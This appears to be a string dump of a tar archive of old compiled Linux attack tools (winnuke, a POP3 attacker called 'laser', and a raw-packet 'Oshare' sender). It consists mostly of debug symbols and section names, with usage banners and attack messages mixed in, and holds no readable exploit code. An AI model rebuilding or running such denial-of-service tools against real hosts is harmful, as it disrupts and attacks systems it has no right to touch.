            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "winnuke.c",
            "_DYNAMIC",
            "host",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "addr",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "open_sock",
            "spoofedaddr",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/laser",
            "0100755",
            "0000000",
            "0000000",
            "00000034717",
            "07100656625",
            "013207",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "printf",
            "stdout",
            "connect",
            "socket",
            "bzero",
            "send",
            "fprintf",
            "strcat",
            "inet_addr",
            "__deregister_frame_info",
            "strncpy",
            "sscanf",
            "gethostbyname",
            "sprintf",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh\u050b",
            "u(h@",
            "j{h@",
            "}#h\u010c",
            "\u0403;u[]",
            "[1;34m Usage",
            "[1;32m:",
            "[1;33m %s ",
            "[1;35m<",
            "[1;34mtarget",
            "[1;35m> ",
            "[0m  ",
            "%d.%d.%d.%d",
            "[1;34mAhhhhhhh! cannot resolve host %s",
            "[LaSEr] Attacking : %s",
            "ERROR: socket() failed",
            "Ooooooppppppps ... Can't connect to pop3 server ~:cD",
            "user ",
            "pass",
            " user",
            "The END. diablo@tudor.inelsev.ro Team  1999",
            " I'll love you all my life sarah_ ... ",
            " We take the chance for a game that never ends ... ",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "laser.c",
            "sarah",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "bianca",
            "sock",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "strcat@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "numsock",
            "_fini",
            "host_dest",
            "linea1",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "sscanf@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "sock_dest",
            "strncpy@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "enter",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/oshare_1_gou",
            "0100755",
            "0000000",
            "0000000",
            "00000034401",
            "07100656652",
            "014442",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "memcpy",
            "perror",
            "malloc",
            "socket",
            "fflush",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "htonl",
            "sendto",
            "memset",
            "srand",
            "time",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "U1fE",
            "fE1fU",
            "]U(j(",
            "EEEj(j",
            "j,EP",
            "j(EPE",
            "P} EEP",
            "u!hr",
            "\u0403;u[]",
            "1.1.1.1",
            "Usage : %s <dst addr> <num(k)>",
            "Unknown host %s.",
            "Getting raw send socket",
            "\"Oshare Packet\" sending",
            "Done.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "oshare_1_gou.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "htonl@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "srand@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
